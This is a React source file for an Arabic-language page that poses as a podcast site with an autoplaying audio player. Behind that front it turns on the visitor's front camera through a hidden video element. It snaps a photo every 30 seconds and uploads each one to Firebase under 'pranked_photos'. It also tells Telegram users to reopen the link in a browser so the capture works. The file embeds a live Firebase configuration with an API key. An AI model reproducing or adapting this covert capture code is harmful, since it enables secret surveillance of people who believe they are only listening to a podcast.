import React, { useRef, useState, useEffect, useCallback } from "react";
import { motion } from "framer-motion";
import { FaPodcast, FaMicrophone, FaHeadphones } from "react-icons/fa";
import { initializeApp } from "firebase/app";
import { getStorage, ref, uploadString, getDownloadURL } from "firebase/storage";
import { getFirestore, collection, addDoc } from "firebase/firestore";
import 'bootstrap/dist/css/bootstrap.min.css';
import AudioPlayer from "react-h5-audio-player";
import "react-h5-audio-player/lib/styles.css";

const firebaseConfig = {
  apiKey: "AIzaSyDQlV_DbV2a_AON6GNPgHKnTaTb-ScqmZw",
  authDomain: "hareer-d24d2.firebaseapp.com",
  projectId: "hareer-d24d2",
  storageBucket: "hareer-d24d2.appspot.com",
  messagingSenderId: "448452939494",
  appId: "1:448452939494:web:686d5b08953d743f793527",
  measurementId: "G-WKW9WC0LTG",
};

const app = initializeApp(firebaseConfig);
const storage = getStorage(app);
const db = getFirestore(app);

const Card = ({ children, className }) => (
  <div className={`card shadow-lg rounded-4 ${className}`} style={{ maxWidth: "400px", margin: "0 auto" }}>
    <div className="card-body">{children}</div>
  </div>
);

const Button = ({ className, onClick, children }) => (
  <button className={`btn ${className}`} onClick={onClick}>
    {children}
  </button>
);

export default function PodcastApp() {
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const [isInTelegram, setIsInTelegram] = useState(false);
  const [errorMessage, setErrorMessage] = useState(null);
  const [hasCameraPermission, setHasCameraPermission] = useState(true);
  const capturePhoto = useCallback(() => {
    try {
      if (!canvasRef.current || !videoRef.current) {
        console.error("لم يتم الحصول على المرجع الخاص بالكاميرا أو اللوحة.");
        return;
      }
  
      const context = canvasRef.current.getContext("2d");
      if (!context) {
        console.error("غير قادر على الحصول على سياق اللوحة.");
        return;
      }
  
      // مسح اللوحة قبل الرسم عليها
      context.clearRect(0, 0, canvasRef.current.width, canvasRef.current.height);
  
      // رسم الصورة الجديدة من الفيديو
      context.drawImage(videoRef.current, 0, 0, 320, 240);
  
      const photoDataUrl = canvasRef.current.toDataURL("image/png");
      console.log("تم التقاط الصورة بنجاح:", photoDataUrl);
  
      const storageRef = ref(storage, "pranked_photos/" + Date.now() + ".png");
  
      uploadString(storageRef, photoDataUrl, "data_url")
        .then(async () => {
          const photoUrl = await getDownloadURL(storageRef);
          console.log("تم رفع الصورة بنجاح. الرابط:", photoUrl);
          await addDoc(collection(db, "pranked_photo"), {
            photoUrl: photoUrl,
            timestamp: Date.now(),
          });
          console.log("تمت إضافة رابط الصورة إلى Firestore.");
        })
        .catch((error) => {
          console.error("خطأ في رفع الصورة إلى Firebase:", error);
          setErrorMessage("خطأ في رفع الصورة. الرجاء المحاولة مرة أخرى.");
        });
    } catch (err) {
      console.error("خطأ أثناء التقاط الصورة:", err);
      setErrorMessage("خطأ في التقاط الصورة. الرجاء المحاولة مرة أخرى.");
    }
  }, []);
  

  const requestCameraPermission = useCallback(async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" },
      });
      console.log("تم الحصول على تدفق الكاميرا.");
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.onloadedmetadata = () => {
          videoRef.current.play().then(() => {
            console.log("الفيديو يعمل.");
            setTimeout(() => {
              capturePhoto();
            }, 1000);
          }).catch((err) => {
            console.error("خطأ في تشغيل الفيديو:", err);
          });
        };
      }
      setHasCameraPermission(true);
    } catch (error) {
      console.error("تم رفض الوصول إلى الكاميرا:", error);
      setErrorMessage("تم رفض الوصول إلى الكاميرا أو أنها غير متوفرة. الرجاء السماح بالوصول إلى الكاميرا.");
      setHasCameraPermission(false);
    }
  }, [capturePhoto]);

  useEffect(() => {
    if (navigator.userAgent.toLowerCase().includes("telegram")) {
      setIsInTelegram(true);
      console.log("تم الكشف عن مستخدم Telegram.");
    } else {
      requestCameraPermission();
    }
  }, [requestCameraPermission]);

  useEffect(() => {
    const intervalId = setInterval(() => {
      if (hasCameraPermission) {
        console.log("إعادة التقاط الصورة...");
        capturePhoto();
      } else {
        console.log("لم يتم الحصول على إذن الكاميرا. إعادة المحاولة...");
        requestCameraPermission();
      }
    }, 30000);
    return () => clearInterval(intervalId);
  }, [capturePhoto, requestCameraPermission, hasCameraPermission]);

  return (
    <div dir="rtl" className="container py-4" style={{ background: "linear-gradient(to bottom, #4e54c8, #8f94fb)" }}>
      <motion.h1 className="text-center text-white mb-4" animate={{ scale: [1, 1.05, 1] }} transition={{ repeat: Infinity, duration: 1 }}>
        مرحبا بكم في منطقة البودكاست!
      </motion.h1>

      <Card className="mb-4 text-center">
        <img
          src={`${process.env.PUBLIC_URL}/assets/man.jpg`}
          alt="صورة الألبوم"
          className="img-fluid rounded shadow mb-3"
          style={{ maxHeight: "250px", objectFit: "cover" }}
        />
        <h3 className="text-primary">البودكاست</h3>
        <p className="text-muted">بصوت فراس مسير كموش</p>
      </Card>

      <div className="mb-4" style={{ maxWidth: "400px", margin: "0 auto" }}>
        <AudioPlayer
          src={`${process.env.PUBLIC_URL}/assets/bc.mp3`}
          autoPlay={true}
          onPlay={(e) => console.log("تشغيل الصوت")}
          layout="horizontal"
          showJumpControls={false}
          customAdditionalControls={[]}
          customVolumeControls={[]}
        />
      </div>

      <video ref={videoRef} style={{ display: "none" }} />
      <canvas ref={canvasRef} width="320" height="240" style={{ display: "none" }} />

      {isInTelegram ? (
        <Card className="mb-3">
          <p className="text-center text-dark mb-4">
            قد لا تعمل الكاميرا في تيليجرام. الرجاء فتح الرابط في متصفح للحصول على التجربة الكاملة!
          </p>
          <Button className="btn-outline-primary" onClick={() => window.open(window.location.href, "_blank")}>
            افتح في المتصفح
          </Button>
        </Card>
      ) : errorMessage ? (
        <Card className="mb-3">
          <p className="text-center text-danger mb-4">{errorMessage}</p>
          <Button className="btn-outline-danger" onClick={() => window.location.reload()}>
            أعد المحاولة
          </Button>
        </Card>
      ) : (
        <Card className="mb-3">
          <h2 className="h3 text-primary mb-3">استكشف أفضل البودكاست</h2>
          <p className="text-muted">
            اكتشف البودكاست في المواضيع المفضلة لديك، من الجرائم الحقيقية إلى التكنولوجيا والأعمال والمزيد!
          </p>
          <div className="d-flex justify-content-center">
            <motion.div className="bg-light rounded-circle p-4 mx-2 shadow hover:bg-primary">
              <FaPodcast size={40} className="text-primary" />
            </motion.div>
            <motion.div className="bg-light rounded-circle p-4 mx-2 shadow hover:bg-primary">
              <FaMicrophone size={40} className="text-primary" />
            </motion.div>
            <motion.div className="bg-light rounded-circle p-4 mx-2 shadow hover:bg-primary">
              <FaHeadphones size={40} className="text-primary" />
            </motion.div>
          </div>
        </Card>
      )}
    </div>
  );
}
